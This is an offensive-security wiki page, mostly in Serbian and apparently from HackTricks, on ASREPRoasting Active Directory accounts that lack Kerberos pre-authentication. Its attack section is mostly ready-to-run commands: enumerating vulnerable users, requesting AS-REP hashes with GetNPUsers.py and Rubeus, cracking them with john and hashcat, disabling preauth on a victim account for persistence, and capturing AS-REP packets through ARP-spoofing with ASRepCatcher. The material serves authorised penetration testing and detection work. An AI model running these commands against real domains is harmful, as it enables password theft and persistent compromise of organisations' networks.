# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast je bezbednosni napad koji koristi korisnike koji nemaju **atribut potreban za Kerberos pre-autentifikaciju**. Suštinski, ova ranjivost omogućava napadačima da zatraže autentifikaciju za korisnika od Kontrolera domena (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom šifrovanom korisnikovim ključem izvedenim iz lozinke, koju napadači mogu pokušati da dešifruju offline kako bi otkrili korisnikovu lozinku.

Glavni zahtevi za ovaj napad su:

- **Nedostatak Kerberos pre-autentifikacije**: Ciljani korisnici ne smeju imati ovu bezbednosnu funkciju omogućenu.
- **Povezanost sa Kontrolerom domena (DC)**: Napadači trebaju pristup DC-u da bi slali zahteve i primali šifrovane poruke.
- **Opcionalni domen korisnički nalog**: Imati domen korisnički nalog omogućava napadačima da efikasnije identifikuju ranjive korisnike putem LDAP upita. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zahtevaj AS_REP poruku
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting sa Rubeus će generisati 4768 sa tipom enkripcije 0x17 i tipom preautentifikacije 0.

### Kršenje
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencija

Force **preauth** nije potreban za korisnika gde imate **GenericAll** dozvole (ili dozvole za pisanje svojstava):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bez kredencijala

Napadač može iskoristiti poziciju man-in-the-middle da uhvati AS-REP pakete dok prolaze kroz mrežu, bez oslanjanja na to da Kerberos pre-autentifikacija bude onemogućena. Stoga funkcioniše za sve korisnike na VLAN-u.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam to omogućava. Štaviše, alat prisiljava klijentske radne stanice da koriste RC4 menjajući Kerberos pregovaranje.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru da komunicirate sa iskusnim hakerima i lovcima na greške!

**Hacking Insights**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Real-Time Hack News**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Latest Announcements**\
Budite informisani o najnovijim nagradama za greške i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

{{#include ../../banners/hacktricks-training.md}}
